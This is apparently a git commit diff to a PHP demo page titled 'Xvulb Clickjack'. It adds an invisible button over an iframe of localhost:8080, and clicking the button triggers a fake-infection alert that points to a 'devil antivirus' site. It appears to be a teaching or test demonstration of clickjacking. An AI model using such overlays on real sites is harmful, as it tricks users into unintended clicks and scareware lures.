9faf911352e8cb48256a996b8afcd9052a8997c7
HoangEZ <nguyenquochoang234@gmail.com>
2018-11-24 03:10:23 +0700

    Xvulb Clickjack

--- php/index.php
+++ php/index.php
@@ -10,10 +10,22 @@
 			}
 			iframe{
 				border:none;
+				position:relative;
+				z-index:0;
+			}
+			#but{
+				position:absolute;
+				z-index:999;
+				right:27px;
+				top: 8px;
+				width:79px;
+				height: 40px;
+				opacity: 0;
 			}
 		</style>
 	</head>
 	<body>
+		<button id="but">Click</button>
 		<iframe src="http://localhost:8080"></iframe>
 		<script>
 			var rsz = function(){
@@ -32,7 +44,10 @@
 		<!-- some attack script below-->
 		<script>
 			document.getElementsByTagName('iframe')[0].addEventListener('load',function(){
-				alert('Oop! Your computer has infected, please visit: http://devilwesite.com to download devil antivirus');
+				var button = document.getElementById('but');
+				button.addEventListener('click',function(){
+					alert('Oop! Your computer has infected, please visit: http://devilwesite.com to download devil antivirus');
+				})
 			})
 		</script>
 	</body>
